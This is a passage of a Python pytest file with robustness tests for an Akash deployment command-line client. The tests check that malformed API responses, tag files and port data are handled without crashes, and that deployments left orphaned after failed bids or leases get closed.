"""Adversarial tests — verify edge-case bugs are fixed."""

import contextlib
import json
import sys
from unittest.mock import MagicMock, patch

import pytest

from just_akash.api import (
    AkashConsoleAPI,
    _extract_bid_price,
    _extract_dseq,
    _extract_provider,
    _extract_ssh_info,
    _load_tags,
    _resolve_dseq,
    _save_tags,
    api_main,
    format_deployments_json,
    format_deployments_table,
)


class TestListDeploymentsHandlesListData:
    """FIXED: list_deployments now handles {"data": [...]} without crashing."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_list_deployments_data_is_list(self, mock_req):
        mock_req.return_value = {"data": [{"deployment": {"state": "active"}, "dseq": "1"}]}
        client = AkashConsoleAPI("key")
        result = client.list_deployments()
        assert len(result) == 1
        assert result[0]["dseq"] == "1"

    @patch.object(AkashConsoleAPI, "_request")
    def test_list_deployments_bare_list_response(self, mock_req):
        mock_req.return_value = [{"deployment": {"state": "active"}, "dseq": "1"}]
        client = AkashConsoleAPI("key")
        result = client.list_deployments()
        assert result == []


class TestGetDeploymentHandlesListData:
    """FIXED: get_deployment handles unexpected response shapes defensively."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_get_deployment_data_is_list(self, mock_req):
        mock_req.return_value = {"data": [{"dseq": "12345", "state": "active"}]}
        client = AkashConsoleAPI("key")
        result = client.get_deployment("12345")
        assert isinstance(result, dict)
        assert result["dseq"] == "12345"

    @patch.object(AkashConsoleAPI, "_request")
    def test_get_deployment_data_is_not_dict(self, mock_req):
        mock_req.return_value = {"data": "not a valid response"}
        client = AkashConsoleAPI("key")
        result = client.get_deployment("12345")
        assert isinstance(result, dict)


class TestExtractSshInfoGracefulOnMissingFields:
    """FIXED: _extract_ssh_info returns None instead of KeyError when
    port-22 entry is missing host or externalPort."""

    def test_port_22_missing_host_key(self):
        dep = {
            "leases": [
                {"status": {"forwarded_ports": {"ssh": [{"port": 22, "externalPort": 2222}]}}}
            ]
        }
        assert _extract_ssh_info(dep) is None

    def test_port_22_missing_external_port_key(self):
        dep = {
            "leases": [{"status": {"forwarded_ports": {"ssh": [{"port": 22, "host": "1.2.3.4"}]}}}]
        }
        assert _extract_ssh_info(dep) is None

    def test_port_22_empty_dict(self):
        dep = {"leases": [{"status": {"forwarded_ports": {"ssh": [{"port": 22}]}}}]}
        assert _extract_ssh_info(dep) is None

    def test_port_22_with_all_fields_still_works(self):
        dep = {
            "leases": [
                {
                    "status": {
                        "forwarded_ports": {
                            "ssh": [{"port": 22, "host": "1.2.3.4", "externalPort": 2222}]
                        }
                    }
                }
            ]
        }
        result = _extract_ssh_info(dep)
        assert result == {"host": "1.2.3.4", "port": 2222, "service": "ssh"}


class TestResolveDseqTagsFirst:
    """FIXED: _resolve_dseq checks tags BEFORE treating as numeric dseq.

    A numeric tag name now correctly resolves to the tagged dseq.
    """

    def test_numeric_tag_resolved_via_tag_lookup(self, tmp_path, monkeypatch):
        from just_akash import api

        tags_file = tmp_path / ".tags.json"
        monkeypatch.setattr(api, "TAGS_FILE", tags_file)
        _save_tags({"12345": "99999"})
        result = _resolve_dseq("99999")
        assert result == "12345"

    def test_numeric_string_not_in_tags_treated_as_dseq(self, tmp_path, monkeypatch):
        from just_akash import api

        tags_file = tmp_path / ".tags.json"
        monkeypatch.setattr(api, "TAGS_FILE", tags_file)
        result = _resolve_dseq("42")
        assert result == "42"


class TestConfirmHandlesEof:
    """FIXED: _confirm() returns False on EOFError instead of crashing."""

    def test_confirm_eof_returns_false(self):
        from just_akash.api import _confirm

        with patch("builtins.input", side_effect=EOFError):
            assert _confirm("Close? (y/N) ") is False


class TestImageOverrideOnlyFirstMatch:
    """FIXED: deploy.py image override uses count=1 to only replace first image."""

    def test_image_override_replaces_only_first(self):
        import re

        sdl = """
services:
  web:
    image: nginx:latest
    expose:
      - port: 80
  worker:
    image: python:3.13-slim
    expose:
      - port: 22
"""
        new_image = "ubuntu:22.04"
        result = re.sub(r"image:\s+[^\n]+", f"image: {new_image}", sdl, count=1)
        assert result.count(f"image: {new_image}") == 1
        assert "python:3.13-slim" in result


class TestTagsAtomicWrite:
    """FIXED: _save_tags uses atomic write (temp file + os.replace)."""

    def test_save_load_roundtrip(self, tmp_path, monkeypatch):
        from just_akash import api

        tags_file = tmp_path / ".tags.json"
        monkeypatch.setattr(api, "TAGS_FILE", tags_file)
        _save_tags({"1": "first", "2": "second"})
        assert _load_tags() == {"1": "first", "2": "second"}

    def test_concurrent_tag_writes_preserve_latest(self, tmp_path, monkeypatch):
        from just_akash import api

        tags_file = tmp_path / ".tags.json"
        monkeypatch.setattr(api, "TAGS_FILE", tags_file)

        _save_tags({"1": "first"})
        _save_tags({"2": "second"})

        tags = _load_tags()
        assert "2" in tags
        assert tags == {"2": "second"}


class TestFormatDeploymentsTableEdgeCases:
    """Edge cases in format_deployments_table that could break."""

    def test_deployment_no_deployment_key(self, tmp_path, monkeypatch):
        from just_akash import api

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")
        dep = {"dseq": "12345", "leases": []}
        result = format_deployments_table([dep])
        assert "12345" in result

    def test_deployment_empty_state(self, tmp_path, monkeypatch):
        from just_akash import api

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")
        dep = {
            "dseq": "12345",
            "deployment": {},
            "leases": [],
        }
        result = format_deployments_table([dep])
        assert "unknown" in result

    def test_very_long_provider_name_truncation(self, tmp_path, monkeypatch):
        from just_akash import api

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")
        long_provider = "akash1" + "a" * 100
        dep = {
            "dseq": "12345",
            "deployment": {"state": "active"},
            "leases": [{"id": {"provider": long_provider}}],
        }
        result = format_deployments_table([dep])
        assert len(result.split("\n")) >= 3


class TestExtractBidPriceNegativePrice:
    """Edge case: negative bid prices would be selected as 'cheapest'."""

    def test_negative_price_sorted_first(self):
        bids = [
            {"price": {"amount": 100, "denom": "uakt"}, "id": {"provider": "a"}},
            {"price": {"amount": -50, "denom": "uakt"}, "id": {"provider": "b"}},
            {"price": {"amount": 10, "denom": "uakt"}, "id": {"provider": "c"}},
        ]
        cheapest = min(bids, key=lambda b: _extract_bid_price(b)[0])
        assert _extract_provider(cheapest) == "b"
        assert _extract_bid_price(cheapest)[0] == -50.0

    def test_zero_price(self):
        bid = {"price": {"amount": 0, "denom": "uakt"}}
        amount, denom = _extract_bid_price(bid)
        assert amount == 0.0


class TestCloseAllDeploymentsCatchesAllExceptions:
    """FIXED: close_all_deployments now catches all exceptions, not just RuntimeError."""

    @patch.object(AkashConsoleAPI, "close_deployment")
    @patch.object(AkashConsoleAPI, "list_deployments")
    def test_type_error_does_not_abort_close_all(self, mock_list, mock_close):
        mock_list.return_value = [{"dseq": "1"}, {"dseq": "2"}, {"dseq": "3"}]
        mock_close.side_effect = [TypeError("unexpected"), {"ok": True}, {"ok": True}]
        client = AkashConsoleAPI("key")
        result = client.close_all_deployments()
        assert len(result["closed"]) == 2


class TestGetProviderEmptyProviderList:
    """Edge cases in get_provider."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_provider_list_with_non_dict_entries(self, mock_req):
        mock_req.return_value = {"data": ["not_a_dict", 42, None]}
        client = AkashConsoleAPI("key")
        result = client.get_provider("akash1target")
        assert result is None

    @patch.object(AkashConsoleAPI, "_request")
    def test_provider_data_is_empty_dict(self, mock_req):
        mock_req.return_value = {"data": {}}
        client = AkashConsoleAPI("key")
        result = client.get_provider("akash1target")
        assert result is None


class TestFormatDeploymentsJsonMissingFields:
    """Edge cases in format_deployments_json with malformed deployment data."""

    def test_deployment_with_no_state(self, tmp_path, monkeypatch):
        from just_akash import api

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")
        dep = {"dseq": "12345", "deployment": {}, "leases": []}
        result = format_deployments_json([dep])
        parsed = json.loads(result)
        assert parsed[0]["state"] == "unknown"

    def test_deployment_missing_deployment_key(self, tmp_path, monkeypatch):
        from just_akash import api

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")
        dep = {"dseq": "12345", "leases": []}
        result = format_deployments_json([dep])
        parsed = json.loads(result)
        assert parsed[0]["state"] == "unknown"


class TestDeployCleanupOnLeaseFailure:
    """FIXED: deployment is cleaned up when lease creation fails."""

    @patch("just_akash.deploy.time")
    @patch("just_akash.deploy.AkashConsoleAPI")
    def test_deployment_closed_on_lease_failure(self, MockAPI, mock_time, tmp_path, monkeypatch):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.delenv("AKASH_PROVIDERS", raising=False)

        SDL_YAML = """
version: "2.0"
services:
  web:
    image: python:3.13-slim
"""
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text(SDL_YAML)

        client = MockAPI.return_value
        client.create_deployment.return_value = {"dseq": "12345", "manifest": "abc"}
        client.get_bids.return_value = [
            {"id": {"provider": "akash1prov"}, "price": {"amount": 10, "denom": "uakt"}}
        ]
        client.create_lease.side_effect = RuntimeError("lease failed")

        counter = [0.0]

        def advance():
            counter[0] += 1
            return counter[0]

        mock_time.time.side_effect = advance
        mock_time.sleep.return_value = None

        with pytest.raises(RuntimeError, match="Failed to create lease"):
            from just_akash.deploy import deploy

            deploy(sdl_path=str(sdl_file), bid_wait=10, bid_wait_retry=10)

        client.create_deployment.assert_called_once()
        client.close_deployment.assert_called_once_with("12345")


class TestApiRequestNonJsonResponse:
    """FIXED: _request handles non-JSON response body gracefully."""

    @patch("just_akash.api.urllib.request.urlopen")
    def test_request_returns_non_json(self, mock_urlopen):
        mock_resp = MagicMock()
        mock_resp.read.return_value = b"not json at all"
        mock_resp.status = 200
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_urlopen.return_value = mock_resp

        client = AkashConsoleAPI("key")
        result = client._request("GET", "/v1/test")
        assert "raw" in result
        assert result["raw"] == "not json at all"

    @patch("just_akash.api.urllib.request.urlopen")
    def test_request_returns_none_body(self, mock_urlopen):
        mock_resp = MagicMock()
        mock_resp.read.return_value = b""
        mock_resp.status = 204
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_urlopen.return_value = mock_resp

        client = AkashConsoleAPI("key")
        result = client._request("DELETE", "/v1/deployments/12345")
        assert result == {}


class TestExtractDseqEdgeCases:
    """FIXED: _extract_dseq handles None values correctly."""

    def test_dseq_is_zero(self):
        assert _extract_dseq({"dseq": 0}) == "0"

    def test_dseq_is_none_returns_none(self):
        assert _extract_dseq({"dseq": None}) is None

    def test_dseq_is_float(self):
        assert _extract_dseq({"dseq": 12345.0}) == "12345.0"

    def test_nested_deployment_id_dseq_is_none(self):
        dep = {"deployment": {"id": {"dseq": None}}}
        assert _extract_dseq(dep) is None


class TestExtractProviderEdgeCases:
    """More edge cases for _extract_provider."""

    def test_id_dict_without_provider(self):
        assert _extract_provider({"id": {"dseq": "123"}}) is None

    def test_nested_bid_id_without_provider(self):
        assert _extract_provider({"bid": {"id": {"dseq": "123"}}}) is None

    def test_provider_is_empty_string(self):
        result = _extract_provider({"id": {"provider": ""}})
        assert result == ""


class TestSaveTagsPermissionsError:
    """Edge case: _save_tags can fail if path is not writable."""

    def test_save_tags_to_nonexistent_dir(self, tmp_path, monkeypatch):
        from just_akash import api

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / "nonexistent" / "dir" / ".tags.json")
        with pytest.raises(FileNotFoundError):
            _save_tags({"1": "test"})


class TestLoadTagsPermissionsError:
    """Edge case: _load_tags with unreadable file."""

    def test_load_tags_unreadable_file(self, tmp_path, monkeypatch):
        from just_akash import api

        tags_file = tmp_path / ".tags.json"
        tags_file.write_text('{"1": "test"}')
        tags_file.chmod(0o000)
        monkeypatch.setattr(api, "TAGS_FILE", tags_file)
        result = _load_tags()
        assert result == {}


class TestEmptyDeploymentsInteractivePick:
    """FIXED: _interactive_pick with empty list raises ValueError (was IndexError)."""

    def test_non_tty_empty_list(self, tmp_path, monkeypatch):
        from just_akash import api

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")
        monkeypatch.setattr(sys.stdin, "isatty", lambda: False)
        client = AkashConsoleAPI("key")
        with pytest.raises(ValueError):
            from just_akash.api import _interactive_pick

            _interactive_pick([], client)


class TestCreateDeploymentResponseShape:
    """Edge case: create_deployment with unexpected response shapes."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_create_deployment_data_is_list(self, mock_req):
        mock_req.return_value = {"data": [{"dseq": "12345"}]}
        client = AkashConsoleAPI("key")
        result = client.create_deployment("sdl")
        assert isinstance(result, dict)

    @patch.object(AkashConsoleAPI, "_request")
    def test_create_deployment_no_data_key(self, mock_req):
        mock_req.return_value = {"dseq": "12345", "manifest": "abc"}
        client = AkashConsoleAPI("key")
        result = client.create_deployment("sdl")
        assert result["dseq"] == "12345"


class TestCloseDeploymentResponseShape:
    """Edge case: close_deployment with unexpected response."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_close_deployment_data_is_list(self, mock_req):
        mock_req.return_value = {"data": [{"closed": True}]}
        client = AkashConsoleAPI("key")
        result = client.close_deployment("12345")
        assert isinstance(result, dict)


# ── Round 2 adversarial tests ────────────────────────────────────────────


class TestGetBidsNonDictResponse:
    """BUG: get_bids crashes with AttributeError when _request returns a list."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_get_bids_list_response(self, mock_req):
        mock_req.return_value = [{"id": {"provider": "akash1a"}}]
        client = AkashConsoleAPI("key")
        result = client.get_bids("12345")
        assert isinstance(result, list)

    @patch.object(AkashConsoleAPI, "_request")
    def test_get_bids_non_dict_non_list(self, mock_req):
        mock_req.return_value = "unexpected string"
        client = AkashConsoleAPI("key")
        result = client.get_bids("12345")
        assert isinstance(result, list)
        assert result == []

    @patch.object(AkashConsoleAPI, "_request")
    def test_get_bids_data_is_string(self, mock_req):
        mock_req.return_value = {"data": "not_a_list"}
        client = AkashConsoleAPI("key")
        result = client.get_bids("12345")
        assert isinstance(result, list)
        assert result == []


class TestStatusNonSshPortMissingHost:
    """BUG: api_main status display crashes with KeyError on non-SSH port
    entries that are missing 'host' or 'externalPort' keys."""

    def test_non_ssh_port_missing_host(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [
                    {"status": {"forwarded_ports": {"web": [{"port": 80, "externalPort": 8080}]}}}
                ],
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out

    def test_non_ssh_port_missing_external_port(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [
                    {"status": {"forwarded_ports": {"web": [{"port": 80, "host": "1.2.3.4"}]}}}
                ],
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out


class TestDeployNoBidsLeavesOrphan:
    """BUG: deploy() creates a deployment but never closes it when no bids arrive."""

    @patch("just_akash.deploy.time")
    @patch("just_akash.deploy.AkashConsoleAPI")
    def test_no_bids_closes_deployment(self, MockAPI, mock_time, tmp_path, monkeypatch):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.delenv("AKASH_PROVIDERS", raising=False)

        SDL_YAML = """
version: "2.0"
services:
  web:
    image: python:3.13-slim
"""
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text(SDL_YAML)

        client = MockAPI.return_value
        client.create_deployment.return_value = {"dseq": "99999", "manifest": "abc"}
        client.get_bids.return_value = []

        counter = [0.0]

        def advance():
            counter[0] += 1
            return counter[0]

        mock_time.time.side_effect = advance
        mock_time.sleep.return_value = None

        with pytest.raises(RuntimeError, match="No bids received"):
            from just_akash.deploy import deploy

            deploy(sdl_path=str(sdl_file), bid_wait=10, bid_wait_retry=10)

        client.close_deployment.assert_called_once_with("99999")


class TestCreateDeploymentReturnsDict:
    """BUG: create_deployment returns raw list when API sends {"data": [...]}.
    Callers like deploy.py do result.get("dseq") which crashes on list."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_returns_dict_when_data_is_list(self, mock_req):
        mock_req.return_value = {"data": [{"dseq": "12345", "manifest": "abc"}]}
        client = AkashConsoleAPI("key")
        result = client.create_deployment("sdl")
        assert isinstance(result, dict)

    @patch.object(AkashConsoleAPI, "_request")
    def test_returns_dict_when_data_is_string(self, mock_req):
        mock_req.return_value = {"data": "unexpected"}
        client = AkashConsoleAPI("key")
        result = client.create_deployment("sdl")
        assert isinstance(result, dict)


class TestCloseDeploymentReturnsDict:
    """BUG: close_deployment returns raw list when API sends {"data": [...]}."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_returns_dict_when_data_is_list(self, mock_req):
        mock_req.return_value = {"data": [{"closed": True}]}
        client = AkashConsoleAPI("key")
        result = client.close_deployment("12345")
        assert isinstance(result, dict)

    @patch.object(AkashConsoleAPI, "_request")
    def test_returns_dict_when_data_is_string(self, mock_req):
        mock_req.return_value = {"data": "unexpected"}
        client = AkashConsoleAPI("key")
        result = client.close_deployment("12345")
        assert isinstance(result, dict)


# ── Round 3 adversarial tests ────────────────────────────────────────────


class TestInteractivePickEmptyListNonTty:
    """BUG: _interactive_pick(deployments=[]) crashes with IndexError on non-tty."""

    def test_empty_list_non_tty(self, tmp_path, monkeypatch):
        from just_akash import api
        from just_akash.api import _interactive_pick

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")
        monkeypatch.setattr(sys.stdin, "isatty", lambda: False)
        client = AkashConsoleAPI("key")
        with pytest.raises((IndexError, ValueError)):
            _interactive_pick([], client)


class TestInteractivePickEmptyListTty:
    """BUG: _interactive_pick(deployments=[]) crashes on tty with ZeroDivisionError."""

    def test_empty_list_tty(self, tmp_path, monkeypatch):
        import termios
        import tty

        from just_akash import api
        from just_akash.api import _interactive_pick

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")
        monkeypatch.setattr(sys.stdin, "isatty", lambda: True)
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)
        monkeypatch.setattr(sys.stdin, "fileno", lambda: 0)
        monkeypatch.setattr(termios, "tcgetattr", lambda fd: [])
        monkeypatch.setattr(termios, "TCSADRAIN", 1)
        monkeypatch.setattr(termios, "tcsetattr", lambda fd, when, attrs: None)
        monkeypatch.setattr(tty, "setraw", lambda fd: None)

        read_iter = iter(["\r"])
        monkeypatch.setattr(sys.stdin, "read", lambda n=1: next(read_iter))

        client = AkashConsoleAPI("key")
        with pytest.raises((IndexError, ValueError)):
            _interactive_pick([], client)


class TestDeployNoCleanupOnForeignBids:
    """BUG: deploy() leaves orphaned deployment when all bids are from
    non-allowed providers (raises RuntimeError but never calls close_deployment)."""

    @patch("just_akash.deploy.time")
    @patch("just_akash.deploy.AkashConsoleAPI")
    def test_foreign_bids_closes_deployment(self, MockAPI, mock_time, tmp_path, monkeypatch):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setenv("AKASH_PROVIDERS", "akash1allowed")

        SDL_YAML = """
version: "2.0"
services:
  web:
    image: python:3.13-slim
"""
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text(SDL_YAML)

        client = MockAPI.return_value
        client.create_deployment.return_value = {"dseq": "77777", "manifest": "abc"}
        client.get_bids.return_value = [
            {"id": {"provider": "akash1foreign"}, "price": {"amount": 10, "denom": "uakt"}}
        ]

        counter = [0.0]

        def advance():
            counter[0] += 1
            return counter[0]

        mock_time.time.side_effect = advance
        mock_time.sleep.return_value = None

        with pytest.raises(RuntimeError, match="NONE from our providers"):
            from just_akash.deploy import deploy

            deploy(sdl_path=str(sdl_file), bid_wait=10, bid_wait_retry=10)

        client.close_deployment.assert_called_once_with("77777")


class TestDeployNoCleanupOnNoProviderInBid:
    """BUG: deploy() leaves orphaned deployment when selected bid has no
    provider address (raises RuntimeError but never calls close_deployment)."""

    @patch("just_akash.deploy.time")
    @patch("just_akash.deploy.AkashConsoleAPI")
    def test_no_provider_in_bid_closes_deployment(self, MockAPI, mock_time, tmp_path, monkeypatch):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.delenv("AKASH_PROVIDERS", raising=False)

        SDL_YAML = """
version: "2.0"
services:
  web:
    image: python:3.13-slim
"""
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text(SDL_YAML)

        client = MockAPI.return_value
        client.create_deployment.return_value = {"dseq": "88888", "manifest": "abc"}
        client.get_bids.return_value = [
            {"price": {"amount": 10, "denom": "uakt"}, "state": "open"}
        ]

        counter = [0.0]

        def advance():
            counter[0] += 1
            return counter[0]

        mock_time.time.side_effect = advance
        mock_time.sleep.return_value = None

        with pytest.raises(RuntimeError, match="no provider address"):
            from just_akash.deploy import deploy

            deploy(sdl_path=str(sdl_file), bid_wait=10, bid_wait_retry=10)

        client.close_deployment.assert_called_once_with("88888")


class TestExtractBidPriceListPrice:
    """BUG: _extract_bid_price crashes with TypeError when price is a list.
    FIXED: now returns inf for non-numeric types."""

    def test_price_is_list(self):
        bid = {"price": [100, "uakt"]}
        amount, denom = _extract_bid_price(bid)
        assert amount == float("inf")
        assert denom == "uact"

    def test_price_is_dict_with_list_amount(self):
        bid = {"price": {"amount": [100], "denom": "uakt"}}
        amount, denom = _extract_bid_price(bid)
        assert amount == float("inf")
        assert denom == "uakt"


class TestListDeploymentsFiltersNonDictEntries:
    """BUG: list_deployments crashes with AttributeError when API returns
    non-dict entries like null, numbers, strings inside the data list."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_data_contains_null_and_numbers(self, mock_req):
        mock_req.return_value = {
            "data": [None, 42, "string", {"deployment": {"state": "active"}, "dseq": "1"}]
        }
        client = AkashConsoleAPI("key")
        result = client.list_deployments()
        assert len(result) == 1
        assert result[0]["dseq"] == "1"

    @patch.object(AkashConsoleAPI, "_request")
    def test_data_contains_only_garbage(self, mock_req):
        mock_req.return_value = {"data": [None, 42, True, "hello"]}
        client = AkashConsoleAPI("key")
        result = client.list_deployments()
        assert result == []


class TestExtractSshInfoNonIterablePorts:
    """BUG: _extract_ssh_info crashes with TypeError when forwarded_ports
    values are not iterable (e.g. None, int)."""

    def test_ports_is_none(self):
        dep = {"leases": [{"status": {"forwarded_ports": {"ssh": None}}}]}
        result = _extract_ssh_info(dep)
        assert result is None

    def test_ports_is_int(self):
        dep = {"leases": [{"status": {"forwarded_ports": {"ssh": 42}}}]}
        result = _extract_ssh_info(dep)
        assert result is None

    def test_ports_is_string(self):
        dep = {"leases": [{"status": {"forwarded_ports": {"ssh": "not a list"}}}]}
        result = _extract_ssh_info(dep)
        assert result is None


class TestFormatDeploymentsTableNonDictEntry:
    """BUG: format_deployments_table crashes with AttributeError when
    a deployment entry is not a dict."""

    def test_non_dict_entry_in_list(self, tmp_path, monkeypatch):
        from just_akash import api

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")
        result = format_deployments_table([None, "string", 42])  # type: ignore[arg-type]
        assert isinstance(result, str)

    def test_mixed_valid_and_invalid(self, tmp_path, monkeypatch):
        from just_akash import api

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")
        dep = {"dseq": "12345", "deployment": {"state": "active"}, "leases": []}
        result = format_deployments_table([None, dep])  # type: ignore[arg-type]
        assert "12345" in result


class TestFormatDeploymentsJsonNonDictEntry:
    """BUG: format_deployments_json crashes with AttributeError when
    a deployment entry is not a dict."""

    def test_non_dict_entry_in_list(self, tmp_path, monkeypatch):
        from just_akash import api

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")
        result = format_deployments_json([None, "string", 42])  # type: ignore[arg-type]
        parsed = json.loads(result)
        assert isinstance(parsed, list)

    def test_mixed_valid_and_invalid(self, tmp_path, monkeypatch):
        from just_akash import api

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")
        dep = {"dseq": "12345", "deployment": {"state": "active"}, "leases": []}
        result = format_deployments_json([dep, None])  # type: ignore[arg-type]
        parsed = json.loads(result)
        assert len(parsed) == 1
        assert parsed[0]["dseq"] == "12345"


class TestResolveDseqDuplicateTagValues:
    """Edge case: _resolve_dseq with duplicate tag values — two dseqs sharing
    the same tag. The iteration order of dict determines which wins, which is
    correct behavior (document it). This test just ensures it doesn't crash."""

    def test_duplicate_tag_returns_one_of_them(self, tmp_path, monkeypatch):
        from just_akash import api

        tags_file = tmp_path / ".tags.json"
        monkeypatch.setattr(api, "TAGS_FILE", tags_file)
        _save_tags({"11111": "my-tag", "22222": "my-tag"})
        result = _resolve_dseq("my-tag")
        assert result in ("11111", "22222")


# ── Round 4 adversarial tests ────────────────────────────────────────────


class TestLoadTagsReturnsNonDict:
    """BUG: _load_tags returns a list when tags file contains a JSON array.
    All callers crash with AttributeError on .get() / .items()."""

    def test_tags_file_is_json_array(self, tmp_path, monkeypatch):
        from just_akash import api

        tags_file = tmp_path / ".tags.json"
        tags_file.write_text('[{"dseq": "12345", "tag": "my-job"}]')
        monkeypatch.setattr(api, "TAGS_FILE", tags_file)
        result = _load_tags()
        assert isinstance(result, dict)
        assert result == {}

    def test_tags_file_is_json_string(self, tmp_path, monkeypatch):
        from just_akash import api

        tags_file = tmp_path / ".tags.json"
        tags_file.write_text('"hello"')
        monkeypatch.setattr(api, "TAGS_FILE", tags_file)
        result = _load_tags()
        assert isinstance(result, dict)

    def test_tags_file_is_json_number(self, tmp_path, monkeypatch):
        from just_akash import api

        tags_file = tmp_path / ".tags.json"
        tags_file.write_text("42")
        monkeypatch.setattr(api, "TAGS_FILE", tags_file)
        result = _load_tags()
        assert isinstance(result, dict)


class TestStatusDisplayNonIterablePorts:
    """BUG: api_main status display crashes with TypeError when forwarded_ports
    values are not iterable (e.g. None, int). Same class of bug as
    _extract_ssh_info but unfixed in the status display loop."""

    def test_ports_is_none(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [{"status": {"forwarded_ports": {"web": None}}}],
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out

    def test_ports_is_int(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [{"status": {"forwarded_ports": {"web": 8080}}}],
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out


class TestExtractLeaseProviderNonDictLease:
    """BUG: _extract_lease_provider crashes with AttributeError when lease
    entries in the list are not dicts (e.g. None, int)."""

    def test_none_in_leases(self):
        from just_akash.api import _extract_lease_provider

        dep = {"leases": [None, {"id": {"provider": "akash1prov"}}]}
        result = _extract_lease_provider(dep)
        assert result == "akash1prov"

    def test_all_non_dict_leases(self):
        from just_akash.api import _extract_lease_provider

        dep = {"leases": [None, 42, "string"]}
        result = _extract_lease_provider(dep)
        assert result is None


class TestExtractSshInfoNonDictLease:
    """BUG: _extract_ssh_info crashes with AttributeError when lease entries
    in the list are not dicts."""

    def test_none_in_leases(self):
        dep = {
            "leases": [
                None,
                {
                    "status": {
                        "forwarded_ports": {
                            "ssh": [{"port": 22, "host": "1.2.3.4", "externalPort": 2222}]
                        }
                    }
                },
            ]
        }
        result = _extract_ssh_info(dep)
        assert result == {"host": "1.2.3.4", "port": 2222, "service": "ssh"}

    def test_all_non_dict_leases(self):
        dep = {"leases": [None, 42, "string"]}
        result = _extract_ssh_info(dep)
        assert result is None


class TestAssertDseqInProduction:
    """BUG: Production code uses `assert dseq` which is stripped by `python -O`.
    Should be proper error handling, not assertions."""

    def test_status_single_dep_no_dseq(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: False)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "list_deployments") as mock_list:
            mock_list.return_value = [{"state": "active"}]
            with pytest.raises(SystemExit):
                api_main()
        captured = capsys.readouterr()
        assert "Error" in captured.out or "error" in captured.out.lower() or captured.err

    def test_connect_single_dep_no_dseq(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "connect"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: False)

        import just_akash.api as api_mod

